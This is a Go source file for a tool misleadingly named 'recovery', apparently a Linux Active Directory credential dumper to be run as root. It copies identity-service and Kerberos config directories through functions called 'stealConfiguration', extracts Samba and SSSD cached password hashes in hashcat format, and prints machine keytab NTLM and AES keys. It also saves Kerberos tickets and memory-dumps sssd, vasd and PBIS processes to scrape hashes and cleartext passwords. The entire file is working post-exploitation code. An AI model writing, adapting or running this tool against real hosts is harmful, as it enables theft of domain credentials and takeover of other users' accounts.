package main

import (
	"bufio"
	"bytes"
	"errors"
	"fmt"
	"io"
	"os"
	"os/exec"
	"path/filepath"
	"regexp"
	"sort"
	"strconv"
	"strings"
	"time"
)

const toolName = "recovery"

var cachedPasswordRegex = regexp.MustCompile(`cachedPassword\s*=\s*([^,"]+),\s*lastCachedPassword\s*=\s*([^"]+)`)

type options struct {
	confFiles    bool
	hashOutput   string
	hashFile     string
	noFile       bool
	kerberosSave bool
	date         string
	baseDir      string
	klistPath    string
}

var (
	tdbdumpPath string
	gcorePath   string
	klistPath   string
)

func main() {
	opts := parseArgs()
	opts.date = time.Now().Format("02-01-2006_15-04-05")
	opts.baseDir = fmt.Sprintf("%s.%s", toolName, opts.date)
	opts.hashFile = sanitizeFilename(opts.hashOutput)
	if opts.hashFile == "" {
		opts.hashFile = "hashes.txt"
	}

	if opts.noFile {
		fmt.Println("I'm in!")
		fmt.Printf("%t %t\n", opts.confFiles, opts.kerberosSave)
		opts.confFiles = false
		opts.kerberosSave = false
	}

	tdbdumpPath = requireCommand("tdbdump", "apt install tdb-tools")
	gcorePath = requireCommand("gcore", "apt install gdb")
	klist, err := resolveCommand("klist")
	if err != nil {
		fmt.Fprintln(os.Stderr, "klist is not installed so it is not possible to list and read kerberos tickets")
		fmt.Println("0 => Install it with 'apt install krb5-user'")
		os.Exit(128)
	}
	klistPath = klist
	opts.klistPath = klist

	requireRoot()

	if opts.confFiles {
		collectConfigurations(&opts)
	}

	dumpSamba()
	collectSSSDHashes(&opts)
	collectVASHashes()
	collectKerberosMachineTickets(&opts)
	collectKerberosUserTickets(&opts)
	memoryDump(&opts)

	if opts.noFile {
		_ = os.RemoveAll(opts.baseDir)
	}

	collectKeytabHash(&opts)
}

func parseArgs() options {
	var opts options
	opts.hashOutput = "hashes.txt"

	for _, arg := range os.Args[1:] {
		switch {
		case arg == "-h" || arg == "--help":
			usage()
			os.Exit(0)
		case arg == "-c" || arg == "--conf-files":
			opts.confFiles = true
		case strings.HasPrefix(arg, "--hash-output="):
			opts.hashOutput = strings.TrimPrefix(arg, "--hash-output=")
		case arg == "-n" || arg == "--no-file":
			opts.noFile = true
		case arg == "-k" || arg == "--kerberos-tickets":
			opts.kerberosSave = true
		}
	}

	return opts
}

func usage() {
	fmt.Printf("Usage : ./%s [OPTION]\n", toolName)
	fmt.Println("        [-c --conf-files] : Create a local backup of configuration files")
	fmt.Println("        [--hash-output=<filename>] : Sets hashes file output to the selected name")
	fmt.Println("        [-n --no-file] : Removes file creation")
	fmt.Printf("        [-k --kerberos-tickets] : Save kerberos tickets in %s.$DATE/kerberos\n", toolName)
	fmt.Println("        [-h --help] : Print this ;)")
}

func requireRoot() {
	if os.Geteuid() != 0 {
		fmt.Fprintln(os.Stderr, "This program must be run as root")
		os.Exit(1337)
	}
}

func requireCommand(name, hint string) string {
	path, err := resolveCommand(name)
	if err != nil {
		fmt.Fprintf(os.Stderr, "%s is not installed so it is not possible to run this action\n", name)
		fmt.Printf("0 => Install it with '%s'\n", hint)
		os.Exit(127)
	}
	return path
}

func resolveCommand(name string) (string, error) {
	if name == "" {
		return "", errors.New("empty command name")
	}
	if filepath.IsAbs(name) {
		if isExecutable(name) {
			return name, nil
		}
		return "", fmt.Errorf("command not executable: %s", name)
	}
	for _, candidate := range bundledCandidates(name) {
		if isExecutable(candidate) {
			return candidate, nil
		}
	}
	path, err := exec.LookPath(name)
	if err != nil {
		return "", err
	}
	return path, nil
}

func bundledCandidates(name string) []string {
	execPath, err := os.Executable()
	if err != nil {
		return nil
	}
	execPath, _ = filepath.EvalSymlinks(execPath)
	baseDir := filepath.Dir(execPath)
	return []string{
		filepath.Join(baseDir, name),
		filepath.Join(baseDir, "bin", name),
		filepath.Join(baseDir, "tools", name),
	}
}

func isExecutable(path string) bool {
	info, err := os.Stat(path)
	if err != nil || info.IsDir() {
		return false
	}
	return info.Mode()&0o111 != 0
}

func collectConfigurations(opts *options) {
	printSection("Configuration copy")
	stealConfiguration([]string{"/run/ipa/ccaches", "/var/lib/dirsrv", "/etc/dirsrv", "/var/lib/softhsm", "/etc/pki", "/etc/ipa"}, "config", opts, "Collecting FreeIPA configuration files")
	stealConfiguration([]string{"/var/lib/sss", "/etc/sssd"}, "config", opts, "Collecting SSSD configuration files")
	stealConfiguration([]string{"/var/opt/quest", "/etc/opt/quest"}, "config", opts, "Collecting VAS configuration files")
	stealConfiguration([]string{"/var/lib/pbis", "/etc/pbis"}, "config", opts, "Collecting PBIS configuration files")
	stealConfiguration([]string{"/var/lib/samba", "/var/cache/samba", "/etc/samba"}, "config", opts, "Collecting Samba configuration files")
	stealConfiguration([]string{"/etc/krb5.conf"}, "config", opts, "Collecting Kerberos configuration file")
}

func stealConfiguration(paths []string, subdir string, opts *options, info string) {
	fmt.Println(info)
	for _, source := range paths {
		stealPath(source, subdir, opts)
	}
	fmt.Println()
}

func stealPath(source, subdir string, opts *options) {
	if opts.noFile {
		return
	}
	info, err := os.Stat(source)
	if err != nil {
		return
	}
	if info.IsDir() {
		_ = filepath.WalkDir(source, func(path string, d os.DirEntry, err error) error {
			if err != nil {
				return nil
			}
			if d.IsDir() {
				return nil
			}
			return copyPlaceholder(path, subdir, opts)
		})
		return
	}
	_ = copyPlaceholder(source, subdir, opts)
}

func copyPlaceholder(src, subdir string, opts *options) error {
	if opts.noFile {
		return nil
	}
	rel := strings.TrimPrefix(src, string(os.PathSeparator))
	rel = strings.ReplaceAll(rel, string(os.PathSeparator), "_")
	destDir := filepath.Join(opts.baseDir, subdir)
	if err := os.MkdirAll(destDir, 0o755); err != nil {
		return err
	}
	dest := filepath.Join(destDir, rel)
	return copyFile(src, dest)
}

func copyFile(src, dest string) error {
	input, err := os.Open(src)
	if err != nil {
		return err
	}
	defer input.Close()
	output, err := os.Create(dest)
	if err != nil {
		return err
	}
	defer output.Close()
	if _, err := io.Copy(output, input); err != nil {
		return err
	}
	return nil
}

func dumpSamba() {
	hasPrivate := dirExists("/var/lib/samba/private")
	hasPassdb := fileExists("/var/lib/samba/passdb.tdb")
	if !hasPrivate && !hasPassdb {
		return
	}
	printSection("Samba Dump")
	if hasPrivate {
		fmt.Println("Samba machine secrets")
		files, _ := filepath.Glob("/var/lib/samba/private/*")
		for _, file := range files {
			if fileInfo(file) {
				summarizeSambaFile(file)
			}
		}
		fmt.Println()
	}
	if hasPassdb {
		fmt.Println("Samba hashes")
		runCommand("pdbedit", "-s", "/etc/samba/smb.conf", "-L", "-w")
		fmt.Println()
	}
}

type tdbEntry struct {
	key         string
	dataLen     int
	description string
}

func summarizeSambaFile(path string) {
	fmt.Printf("  %s\n", path)
	entries := parseTdbEntries(path)
	if len(entries) == 0 {
		fmt.Println("    (no entries found)")
		fmt.Println()
		return
	}
	for _, entry := range entries {
		fmt.Printf("    %s (%d bytes)\n", entry.key, entry.dataLen)
		if entry.description != "" {
			fmt.Printf("      %s\n", entry.description)
		}
	}
	fmt.Println()
}

func parseTdbEntries(path string) []tdbEntry {
	output, err := execCommand(tdbdumpPath, path).Output()
	if err != nil {
		fmt.Fprintf(os.Stderr, "failed to read %s: %v\n", path, err)
		return nil
	}
	var entries []tdbEntry
	var currentKey string
	scanner := bufio.NewScanner(bytes.NewReader(output))
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if strings.HasPrefix(line, "key(") {
			currentKey = extractQuotedValue(line)
			continue
		}
		if strings.HasPrefix(line, "data(") && currentKey != "" {
			length := extractDataLength(line)
			entries = append(entries, tdbEntry{
				key:         currentKey,
				dataLen:     length,
				description: describeTdbData(currentKey, line),
			})
			currentKey = ""
		}
	}
	return entries
}

func extractQuotedValue(line string) string {
	start := strings.Index(line, "\"")
	end := strings.LastIndex(line, "\"")
	if start == -1 || end == -1 || end <= start {
		return ""
	}
	return line[start+1 : end]
}

func extractDataLength(line string) int {
	start := strings.Index(line, "(")
	end := strings.Index(line, ")")
	if start == -1 || end == -1 || end <= start {
		return 0
	}
	value := line[start+1 : end]
	length, err := strconv.Atoi(value)
	if err != nil {
		return 0
	}
	return length
}

func describeTdbData(key, line string) string {
	start := strings.Index(line, "\"")
	end := strings.LastIndex(line, "\"")
	if start == -1 || end == -1 || end <= start {
		return ""
	}
	raw := line[start+1 : end]
	data := decodeEscapedBytes(raw)
	if len(data) == 0 {
		return ""
	}
	if desc := describeKnownKey(key, data); desc != "" {
		return desc
	}
	switch {
	case isPrintable(data):
		return fmt.Sprintf("text=%q", strings.TrimRightFunc(string(data), func(r rune) bool { return r == 0 }))
	default:
		return fmt.Sprintf("hex=%s", formatHex(data))
	}
}

func describeKnownKey(key string, data []byte) string {
	switch key {
	case "INFO/minor_version":
		return fmt.Sprintf("minor version = %d", littleEndianValue(data))
	case "NEXT_RID":
		return fmt.Sprintf("next RID = %d", littleEndianValue(data))
	case "INFO/version":
		return fmt.Sprintf("version = %d", littleEndianValue(data))
	case "SECRETS/SID/LOK":
		return fmt.Sprintf("machine secret (%d bytes)", len(data))
	default:
		return ""
	}
}

func littleEndianValue(data []byte) uint32 {
	var value uint32
	for i := len(data) - 1; i >= 0; i-- {
		value = (value << 8) | uint32(data[i])
	}
	return value
}

func decodeEscapedBytes(raw string) []byte {
	var result []byte
	for i := 0; i < len(raw); {
		if raw[i] == '\\' && i+2 < len(raw) {
			if b, err := strconv.ParseUint(raw[i+1:i+3], 16, 8); err == nil {
				result = append(result, byte(b))
				i += 3
				continue
			}
		}
		result = append(result, raw[i])
		i++
	}
	return result
}

func formatHex(data []byte) string {
	if len(data) == 0 {
		return ""
	}
	limit := len(data)
	if limit > 16 {
		limit = 16
	}
	parts := make([]string, limit)
	for i := 0; i < limit; i++ {
		parts[i] = fmt.Sprintf("%02X", data[i])
	}
	if len(data) > limit {
		return strings.Join(parts, " ") + " ..."
	}
	return strings.Join(parts, " ")
}

func isPrintable(data []byte) bool {
	for _, b := range data {
		if b == 0 {
			continue
		}
		if b < 32 || b > 126 {
			return false
		}
	}
	return true
}

func collectSSSDHashes(opts *options) {
	dbs, err := filepath.Glob("/var/lib/sss/db/*ldb")
	if err != nil || len(dbs) == 0 {
		return
	}
	printSection("SSSD Hashes Dump")
	for _, db := range dbs {
		fmt.Println()
		accounts := parseSSSDDatabase(db)
		if len(accounts) == 0 {
			fmt.Printf("No hash found in %s\n", db)
			continue
		}
		fmt.Printf("%d hashes found in %s\n", len(accounts), db)
		keys := make([]string, 0, len(accounts))
		for k := range accounts {
			keys = append(keys, k)
		}
		sort.Strings(keys)
		for _, account := range keys {
			hash := accounts[account]
			fmt.Printf("Account :\t%s\n", account)
			fmt.Printf("\thashcat (sha512crypt 1800): %s\n\n", hash)
			if err := opts.appendHash(account, accounts[account]); err != nil {
				fmt.Fprintf(os.Stderr, "failed to dump hash for %s: %v\n", account, err)
			}
		}
		fmt.Println(" =====> Adding these hashes to the", opts.hashFile, "file <=====")
	}
	fmt.Println()
}

func parseSSSDDatabase(path string) map[string]string {
	accounts := make(map[string]string)
	output, err := execCommand(tdbdumpPath, path).Output()
	if err != nil {
		return accounts
	}
	scanner := bufio.NewScanner(bytes.NewReader(output))
	for scanner.Scan() {
		account, hash := cachedPasswordEntry(scanner.Text())
		if account != "" && hash != "" {
			accounts[account] = hash
		}
	}
	return accounts
}

func cachedPasswordEntry(line string) (string, string) {
	if !strings.Contains(line, "cachedPassword") {
		return "", ""
	}
	matches := cachedPasswordRegex.FindStringSubmatch(line)
	if len(matches) != 3 {
		return "", ""
	}
	account := strings.TrimSpace(matches[1])
	hash := normalizeHashCandidate(matches[2])
	return account, hash
}

func normalizeHashCandidate(raw string) string {
	if idx := strings.Index(raw, "achedPassword"); idx != -1 {
		raw = raw[:idx]
	}
	raw = strings.TrimSpace(raw)
	raw = strings.ReplaceAll(raw, `\$`, `$`)
	return raw
}

func collectVASHashes() {
	if !dirExists("/var/opt/quest") {
		return
	}
	printSection("VAS Hashes Dump")
	runCommand("sqlite3", "/var/opt/quest/vas/authcache/vas_auth.vdb", "SELECT krb5pname, sha1hash, legacyHash FROM authcache")
	fmt.Println()
}

func collectKerberosMachineTickets(opts *options) {
	if !dirExists("/var/lib/pbis") && !dirExists("/var/opt/quest/vas") && !dirExists("/var/lib/sss/db") {
		return
	}
	printSection("Kerberos Machine Ticket Dump")
	listSSSDTickets(opts)
	listVASTickets()
	listPBISTickets()
	fmt.Println()
}

func listSSSDTickets(opts *options) {
	files, _ := filepath.Glob("/var/lib/sss/db/ccache_*")
	if len(files) == 0 {
		return
	}
	fmt.Println("SSSD tickets")
	for _, file := range files {
		if fileInfo(file) {
			runCommand(opts.klistPath, "-c", file, "-e", "-d", "-f")
			if opts.kerberosSave {
				stealPath(file, "kerberos_tickets", opts)
			}
			fmt.Println()
		}
	}
}

func listVASTickets() {
	if !fileExists("/etc/opt/quest/vas/host.keytab") {
		return
	}
	fmt.Println("VAS tickets")
	runPreferredCommand([]string{"/opt/quest/bin/ktutil", "ktutil"}, "--keytab=/etc/opt/quest/vas/host.keytab")
	fmt.Println()
}

func listPBISTickets() {
	if !dirExists("/var/lib/pbis") {
		return
	}
	fmt.Println("PBIS tickets")
	if fileExists("/etc/krb5.keytab") {
		cmd := execPreferredCommand([]string{"/opt/pbis/bin/ktutil", "ktutil"})
		cmd.Stdin = strings.NewReader("read_kt /etc/krb5.keytab\nlist\nquit\n")
		run(cmd)
	}
	files, _ := filepath.Glob("/var/lib/pbis/krb5cc_lsass*")
	for _, file := range files {
		if fileInfo(file) {
			runPreferredCommand([]string{"/opt/pbis/bin/klist", "klist"}, "-c", file, "-e", "-d", "-f")
			fmt.Println()
		}
	}
}

func collectKerberosUserTickets(opts *options) {
	if !dirExists("/var/lib/sss/secrets/secrets.ldb") && len(mustGlob("/tmp/krb5*")) == 0 {
		return
	}
	printSection("Kerberos User Ticket Dump")
	files := mustGlob("/tmp/krb5*")
	for _, file := range files {
		if fileInfo(file) {
			fmt.Println("User Kerberos tickets")
			runCommand(opts.klistPath, "-c", file, "-e", "-d", "-f")
			fmt.Println()
			if opts.kerberosSave {
				stealPath(file, "kerberos_tickets", opts)
			}
		}
	}
	fmt.Println()
}

func memoryDump(opts *options) {
	sssdPids := findProcesses("sss")
	vasPids := findProcesses("vasd")
	pbisPids := findProcesses("lwsmd|lw-")
	if len(sssdPids) == 0 && len(vasPids) == 0 && len(pbisPids) == 0 {
		return
	}
	printSection("Memory Dump")
	if len(sssdPids) > 0 {
		dumpSSSDProcesses(opts, sssdPids)
	}
	if len(vasPids) > 0 {
		dumpVASProcesses(opts, vasPids)
	}
	if len(pbisPids) > 0 {
		dumpPBISProcesses(opts, pbisPids)
	}
}

func dumpSSSDProcesses(opts *options, pids []int) {
	fmt.Println("SSSD processes dump")
	for _, pid := range pids {
		name := processName(pid)
		fmt.Printf("Dumping %s (%d)\n", name, pid)
		dumps := dumpProcess(pid, opts)
		for _, dump := range dumps {
			analyzeProcessDump(pid, dump)
		}
	}
	fmt.Println()
}

func dumpVASProcesses(opts *options, pids []int) {
	fmt.Println("VAS processes dump")
	for _, pid := range pids {
		name := processName(pid)
		fmt.Printf("Dumping %s (%d)\n", name, pid)
		dumps := dumpProcess(pid, opts)
		for _, dump := range dumps {
			lines := runStrings(dump)
			printMatchingLines(lines, []string{"MAPI", "$6$"})
		}
	}
	fmt.Println()
}

func dumpPBISProcesses(opts *options, pids []int) {
	fmt.Println("PBIS processes")
	for _, pid := range pids {
		name := processName(pid)
		fmt.Printf("Dumping %s (%d)\n", name, pid)
		dumps := dumpProcess(pid, opts)
		for _, dump := range dumps {
			lines := runStrings(dump)
			printMatchingLines(lines, []string{"MAPI", "$6$"})
		}
	}
	fmt.Println()
}

func collectKeytabHash(opts *options) {
	if !fileExists("/etc/krb5.keytab") {
		return
	}
	printSection("Keytab hash dump")
	output, err := execCommand(opts.klistPath, "-t", "-K", "-e", "-k", "/etc/krb5.keytab").CombinedOutput()
	if err != nil {
		fmt.Fprintln(os.Stderr, string(output))
		return
	}
	principal, ntlm, aes128, aes256 := parseKeytabOutput(string(output))
	fmt.Println("Account :\t", principal)
	if domain := domainFromPrincipal(principal); domain != "" {
		fmt.Println("Domain :\t", "@"+domain)
	}
	fmt.Println("NTLM hash :\t", ntlm)
	fmt.Println("AES-128 key :\t", aes128)
	fmt.Println("AES-256 key :\t", aes256)
	if opts.kerberosSave {
		fmt.Println("[+] Adding machine keytab to /kerberos")
		stealPath("/etc/krb5.keytab", "kerberos_tickets", opts)
	}
	fmt.Println()
}

func parseKeytabOutput(output string) (principal, ntlm, aes128, aes256 string) {
	lines := strings.Split(output, "\n")
	for _, line := range lines {
		trimmed := strings.TrimSpace(line)
		if trimmed == "" {
			continue
		}
		if strings.Contains(trimmed, "@") && principal == "" {
			fields := strings.Fields(trimmed)
			if len(fields) >= 2 {
				principal = fields[len(fields)-1]
			}
		}
		if strings.Contains(trimmed, "arcfour") {
			ntlm = extractHex(trimmed, 32)
		}
		if strings.Contains(trimmed, "aes128") {
			aes128 = extractHex(trimmed, 32)
		}
		if strings.Contains(trimmed, "aes256") {
			aes256 = extractHex(trimmed, 64)
		}
	}
	return principal, ntlm, aes128, aes256
}

func domainFromPrincipal(principal string) string {
	parts := strings.Split(principal, "@")
	if len(parts) == 2 {
		return parts[1]
	}
	return ""
}

func extractHex(line string, limit int) string {
	re := regexp.MustCompile(`0x([0-9A-Fa-f]+)`) //nolint:lll
	match := re.FindStringSubmatch(line)
	if len(match) < 2 {
		return ""
	}
	hex := match[1]
	if limit > 0 && len(hex) > limit {
		hex = hex[:limit]
	}
	return hex
}

func printSection(name string) {
	border := strings.Repeat("=", len(name)+10)
	fmt.Println()
	fmt.Println(border)
	fmt.Printf("=  %s  =\n", name)
	fmt.Println(border)
	fmt.Println()
}

func (opts *options) appendHash(account, hash string) error {
	if opts.noFile || account == "" || hash == "" {
		return nil
	}
	if err := os.MkdirAll(opts.baseDir, 0o755); err != nil {
		return err
	}
	path := filepath.Join(opts.baseDir, opts.hashFile)
	f, err := os.OpenFile(path, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0o600)
	if err != nil {
		return err
	}
	defer f.Close()
	if _, err := fmt.Fprintf(f, "%s:%s\n", account, hash); err != nil {
		return err
	}
	return nil
}

func sanitizeFilename(name string) string {
	if name == "" {
		return ""
	}
	valid := regexp.MustCompile(`[^A-Za-z0-9._-]`)
	cleaned := valid.ReplaceAllString(name, "_")
	cleaned = strings.Trim(cleaned, "_.-")
	return cleaned
}

func dirExists(path string) bool {
	info, err := os.Stat(path)
	return err == nil && info.IsDir()
}

func fileExists(path string) bool {
	info, err := os.Stat(path)
	return err == nil && info.Mode().IsRegular()
}

func mustGlob(pattern string) []string {
	paths, _ := filepath.Glob(pattern)
	return paths
}

func fileInfo(path string) bool {
	info, err := os.Stat(path)
	return err == nil && info.Mode().IsRegular()
}

func runCommand(name string, args ...string) {
	cmd := execCommand(name, args...)
	run(cmd)
}

func runPreferredCommand(names []string, args ...string) {
	cmd := execPreferredCommand(names, args...)
	run(cmd)
}

func execCommand(name string, args ...string) *exec.Cmd {
	path, err := resolveCommand(name)
	if err == nil {
		return exec.Command(path, args...)
	}
	return exec.Command(name, args...)
}

func execPreferredCommand(names []string, args ...string) *exec.Cmd {
	path, err := resolveFirstCommand(names...)
	if err == nil {
		return exec.Command(path, args...)
	}
	if len(names) > 0 {
		return exec.Command(names[0], args...)
	}
	return exec.Command("", args...)
}

func resolveFirstCommand(names ...string) (string, error) {
	for _, name := range names {
		path, err := resolveCommand(name)
		if err == nil {
			return path, nil
		}
	}
	return "", fmt.Errorf("unable to resolve any command from %v", names)
}

func run(cmd *exec.Cmd) {
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	if err := cmd.Run(); err != nil {
		fmt.Fprintf(os.Stderr, "command '%s' failed: %v\n", strings.Join(cmd.Args, " "), err)
	}
}

func findProcesses(pattern string) []int {
	cmd := execCommand("ps", "-aeo", "pid,args")
	output, err := cmd.Output()
	if err != nil {
		return nil
	}
	regex := regexp.MustCompile(pattern)
	var ids []int
	scanner := bufio.NewScanner(bytes.NewReader(output))
	for scanner.Scan() {
		line := scanner.Text()
		fields := strings.Fields(line)
		if len(fields) < 2 {
			continue
		}
		pid, err := strconv.Atoi(fields[0])
		if err != nil {
			continue
		}
		command := strings.Join(fields[1:], " ")
		if regex.MatchString(command) && !strings.Contains(command, "grep") {
			ids = append(ids, pid)
		}
	}
	return ids
}

func processName(pid int) string {
	cmd := execCommand("ps", "-p", strconv.Itoa(pid), "-o", "comm=")
	output, err := cmd.Output()
	if err != nil {
		return "unknown"
	}
	return strings.TrimSpace(string(output))
}

func dumpProcess(pid int, opts *options) []string {
	dir := filepath.Join(opts.baseDir, "processes")
	if err := os.MkdirAll(dir, 0o755); err != nil {
		return nil
	}
	name := processName(pid)
	base := filepath.Join(dir, fmt.Sprintf("process.%s", name))
	cmd := execCommand(gcorePath, "-o", base, strconv.Itoa(pid))
	if err := cmd.Run(); err != nil {
		return nil
	}
	return []string{fmt.Sprintf("%s.%d", base, pid)}
}

func analyzeProcessDump(pid int, path string) {
	lines := runStrings(path)
	hashes := filterHashLines(lines)
	if len(hashes) > 0 {
		fmt.Println("[+] Hash(es) found !")
		for _, line := range hashes {
			fmt.Printf("  %s\n", line)
		}
		fmt.Println()
	}
	detectClearPasswords(lines)
}

func runStrings(path string) []string {
	cmd := execCommand("strings", path)
	output, err := cmd.Output()
	if err != nil {
		return nil
	}
	return strings.Split(string(output), "\n")
}

func filterHashLines(lines []string) []string {
	seen := map[string]struct{}{}
	var hashes []string
	for _, line := range lines {
		if idx := strings.Index(line, "$6$"); idx != -1 {
			candidate := line[idx:]
			if len(candidate) > 106 {
				candidate = candidate[:106]
			}
			if len(candidate) == 106 {
				if _, ok := seen[candidate]; !ok {
					seen[candidate] = struct{}{}
					hashes = append(hashes, candidate)
				}
			}
		}
	}
	return hashes
}

func detectClearPasswords(lines []string) {
	regex := regexp.MustCompile(`[0-9]{10}`)
	for i, line := range lines {
		if !strings.Contains(line, "XXXXXX") {
			continue
		}
		match := regex.FindString(line)
		if match == "" || i+2 >= len(lines) {
			continue
		}
		password := lines[i+2]
		username := ticketUsername(match)
		if username == "" {
			continue
		}
		fmt.Println("[+] Clear password(s) found !")
		fmt.Println("  Account :\t", username)
		fmt.Println("  Password :\t", password)
		fmt.Println("  Domain UID :\t", match)
		fmt.Println()
	}
}

func ticketUsername(uid string) string {
	files := mustGlob(fmt.Sprintf("/tmp/krb5cc_%s*", uid))
	for _, file := range files {
		if !fileInfo(file) {
			continue
		}
		output, err := execCommand(klistPath, "-c", file).Output()
		if err != nil {
			continue
		}
		scanner := bufio.NewScanner(bytes.NewReader(output))
		for scanner.Scan() {
			if strings.Contains(scanner.Text(), "Default principal") {
				parts := strings.Split(scanner.Text(), ":")
				if len(parts) < 2 {
					continue
				}
				principal := strings.TrimSpace(parts[1])
				return strings.Split(principal, "@")[0]
			}
		}
	}
	return ""
}

func printMatchingLines(lines []string, patterns []string) {
	seen := map[string]struct{}{}
	for _, line := range lines {
		for _, pat := range patterns {
			if strings.Contains(line, pat) {
				if _, ok := seen[line]; ok {
					continue
				}
				seen[line] = struct{}{}
				fmt.Println(line)
			}
		}
	}
}
